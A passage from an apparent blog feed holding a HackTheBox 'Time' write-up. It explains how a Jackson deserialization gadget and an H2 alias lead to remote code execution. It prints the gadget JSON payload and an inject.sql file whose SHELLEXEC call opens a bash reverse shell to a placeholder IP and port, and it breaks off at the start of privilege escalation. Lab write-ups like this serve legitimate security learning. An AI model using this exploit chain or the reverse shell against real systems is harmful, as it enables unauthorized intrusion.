&lt;li&gt;&lt;a href=&#34;https://people.cs.kuleuven.be/~stijn.volckaert/papers/2018_DIMVA_Interpreters.pdf&#34;&gt;https://people.cs.kuleuven.be/~stijn.volckaert/papers/2018_DIMVA_Interpreters.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=cSSpnq362Bk&#34;&gt;James Bennett - A Bit about Bytes: Understanding Python Bytecode - PyCon 2018&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=45BhX5wSeVs&#34;&gt;CPython - Bytecode and Virtual Machine - Stephane Wirtel&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Time Hackthebox</title>
      <link>https://vlagh3.github.io/writeups/htb/time/</link>
      <pubDate>Thu, 27 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://vlagh3.github.io/writeups/htb/time/</guid>
      <description>Overview This box is a Linux one. For the initial foothold you need to exploit a bug within the Jackson library for deserializing JSON&amp;rsquo;s leading to a SSRF which can leverage a RCE. Once on the box a simple classic enumeration reveals a root bash script with read/write access. Consequenlty, just importing your pub SSH key into the authorized_keys file will grant access to root.
Enumeration Running nmap reveals 2 services:</description>
      <content>&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
&lt;p&gt;This box is a Linux one. For the initial foothold you need to exploit a bug within the Jackson library for deserializing &lt;strong&gt;JSON&amp;rsquo;s&lt;/strong&gt; leading to a SSRF which can leverage a RCE. Once on the box a simple classic enumeration reveals a root bash script with read/write access. Consequenlty, just importing your pub &lt;strong&gt;SSH&lt;/strong&gt; key into the &lt;code&gt;authorized_keys&lt;/code&gt; file will grant access to root.&lt;/p&gt;
&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
&lt;p&gt;Running nmap reveals 2 services:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; nmap -sC -sV -oA nmap/time 10.10.10.214
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    Apache httpd 2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Online JSON parser
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we check the web server, we see that we can beutify/validate JSON. Also, the validate functionality is in Beta. So let&amp;rsquo;s check that first.
&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Upon submitting &lt;code&gt;{&amp;quot;test&amp;quot;}&lt;/code&gt; we see the following error:
&lt;code&gt;Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So it&amp;rsquo;s expecting an array: &lt;code&gt;[&amp;quot;test&amp;quot;]&lt;/code&gt;.
But that also throws an error:
&lt;code&gt;Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id &#39;test&#39; as a subtype of [simple type, class java.lang.Object]: no such class found&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now, in both of our errors we see that they&amp;rsquo;re thrown by a library called &lt;em&gt;jackson&lt;/em&gt;, which is used to
serialize or map POJO &lt;em&gt;(Plain Old Java Objects)&lt;/em&gt; to JSON and deserialize JSON to POJO. With some more searching we find a &lt;a href=&#34;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&#34;&gt;CVE&lt;/a&gt; which addresses a deserialization vulnerability where an attacker could control the class to be deserialized.&lt;/p&gt;
&lt;h2 id=&#34;understanding-the-cve&#34;&gt;Understanding the CVE&lt;/h2&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;What is serialization/deserialization&lt;/strong&gt;&lt;/em&gt;
In order to understand what deserialization vulnerabilities are and behave, we firstly need to get familiar with what serialization &amp;amp; deserialization is. Swapneil Kumar Dash wrote a beautiful &lt;a href=&#34;https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d&#34;&gt;article&lt;/a&gt; about this, however I will provide a short overview in this post as well.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In computing, serialization  is the process of translating a data structure or object state into a format that can be stored or transmitted and reconstructed later. Deserialization is the opposite.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In our case, we translate java objects into JSON and vice-versa.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* What could go wrong ?
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Usually, in java we can use something like this to deserialize data:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FileInputStream fin  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FileInputStream&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;your/file/path&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectInputStream in &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectInputStream&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;fin&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;customClassInstance  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CustomClass&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; in&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The main problem lies within the way readObject deserializes data which executes the class while also
throwing an error if we give it a serialized input of a different class.&lt;/p&gt;
&lt;p&gt;I won&amp;rsquo;t go into much detail here on this topic, since it&amp;rsquo;s a broad one. However, if you&amp;rsquo;re interested in
learning more about it you should check the resources and &lt;a href=&#34;https://www.youtube.com/watch?v=t-zVC-CxYjw&#34;&gt;this talk&lt;/a&gt; by &lt;strong&gt;Alexei Kojenov&lt;/strong&gt; which also made some great &lt;a href=&#34;https://github.com/kojenov/serial&#34;&gt;examples&lt;/a&gt; you can play
around with.
&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;How java gadgets work&lt;/strong&gt;&lt;/em&gt;
Gadgets are just a class or funcion that&amp;rsquo;s available within the executing scope of an application. For example the following code is a simple implementation in Java:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* CacheManager.java */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CacheManager&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;implements&lt;/span&gt; Serializable &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; Runnable initHook&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ObjectInputStream in&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		in&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;defaultReadObject&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		initHook&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* CommandTask.java */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CommandTask&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;implements&lt;/span&gt; Runable&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; Serializable &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String cmd&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CommandTask&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String cmd&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cmd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cmd&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		Runtime&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cmd&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here, an attacker can inject a serialized &lt;code&gt;CommandTask&lt;/code&gt; into an input stream that will be read by &lt;code&gt;CacheManager&lt;/code&gt;, which in return invokes run. Therefore, he gains arbitrary command execution.
&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Jackson library deserialization vulnerability POC&lt;/strong&gt;&lt;/em&gt;
The &lt;em&gt;CVE&lt;/em&gt; of interest is focusing mostly on the &lt;em&gt;Jackson&lt;/em&gt; library. They found that when &lt;em&gt;Jackson&lt;/em&gt; deserializes a specific class (&lt;code&gt;ch.qos.logback.core.db.DriverManagerConnectionSource&lt;/code&gt;), it can be abused to instantiate a Java Database Connectivity &lt;em&gt;(JDBC)&lt;/em&gt;, which is used to connect &amp;amp; interact with the dabase. To understand better let&amp;rsquo;s break down the payload used in the &lt;a href=&#34;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&#34;&gt;&lt;strong&gt;POC&lt;/strong&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ &amp;quot;[\&amp;quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&amp;quot;, {\&amp;quot;url\&amp;quot;:\&amp;quot;jdbc:h2:mem:\&amp;quot;}]&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As said previously we use the &lt;code&gt;DriverManagerConnectionSource&lt;/code&gt; class to pass an url, which will trigger &lt;a href=&#34;https://www.javadoc.io/doc/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#setUrl(java.lang.String)&#34;&gt;&lt;code&gt;setUrl&lt;/code&gt;&lt;/a&gt;. Afterwards, the object is serialized into a JSON object again. Consequently, the &lt;code&gt;getConnection()&lt;/code&gt; &lt;a href=&#34;https://www.javadoc.io/static/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#getConnection()&#34;&gt;method&lt;/a&gt; is called which creates an in-memory database. This is further used to create a remote connection.
&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Until now, we&amp;rsquo;ve only got a way to generate a Server Side Request Forgery &lt;em&gt;(SSRF)&lt;/em&gt;. So how could we turn this into a full chain RCE ?
In order to achieve that, the guys from &lt;a href=&#34;https://doyensec.com/&#34;&gt;doyensec&lt;/a&gt; leveraged the &lt;a href=&#34;http://www.h2database.com/html/features.html&#34;&gt;H2&lt;/a&gt; JDBC driver which has the capability to run SQL scripts from the JDBC url. This alone won&amp;rsquo;t allow an attacker to run Java code inside the JVM context, however H2 has the capability to specify custom aliases containing java code &lt;a href=&#34;https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html&#34;&gt;which can be abused&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ALIAS&lt;/span&gt; SHELLEXEC &lt;span style=&#34;color:#66d9ef&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$$&lt;/span&gt; String shellexec(String cmd) throws java.io.IOException &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	java.util.Scanner s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; java.util.Scanner(Runtime.getRuntime().&lt;span style=&#34;color:#66d9ef&#34;&gt;exec&lt;/span&gt;(cmd).getInputStream())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		.useDelimiter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\\A&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s.hasNext() &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; s.&lt;span style=&#34;color:#66d9ef&#34;&gt;next&lt;/span&gt;() : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}$$&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CALL&lt;/span&gt; SHELLEXEC(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As a result, we only need to serve a sql file to the target machine that makes the request to our in-memory &lt;em&gt;DB&lt;/em&gt; with the use of &lt;code&gt;DriverManagerConnectionSource&lt;/code&gt; and we have remote code execution.&lt;/p&gt;
&lt;h2 id=&#34;leveraging-what-weve-learned-for-getting-user&#34;&gt;Leveraging what we&amp;rsquo;ve learned for getting user&lt;/h2&gt;
&lt;p&gt;We&amp;rsquo;ve learned that we can use a deserialization vulnerability within Jackson to leverage a connection to a in-memory &lt;em&gt;DB&lt;/em&gt;, which accepts aliases that can be used to execute commands. So, all wee need to do is:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;em&gt;Prepare the &lt;code&gt;inject.sql&lt;/code&gt; script&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CREATE ALIAS SHELLEXEC AS $$ String &lt;span style=&#34;color:#a6e22e&#34;&gt;shellexec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String cmd&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;io&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;IOException&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;util&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Scanner&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;util&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Scanner&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Runtime&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cmd&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getInputStream&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;useDelimiter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\\A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;hasNext&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;$$&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CALL &lt;span style=&#34;color:#a6e22e&#34;&gt;SHELLEXEC&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;bash &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dev&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tcp&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;IP&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;PORT 0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt;1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Setup http server &amp;amp; netcat listener&lt;/em&gt;
&lt;img src=&#34;https://i.imgur.com/kYaG0vZ.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Abuse the deserialization vulnerability &amp;amp; use the &lt;code&gt;DriverManagerConnectionSource&lt;/code&gt; gadget&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Enjoy your shell&lt;/em&gt;
&lt;img src=&#34;https://i.imgur.com/jh0fwLP.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;privilige-escalation&#34;&gt;Privilige escalation&lt;/h2&gt;
&lt;p&gt;Once on the box, a simple enumeration reveals that we have write access to a backup script ran by root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash-5.0$ cat /usr/bin/timer_backup.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /usr/bin/timer_backup.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;
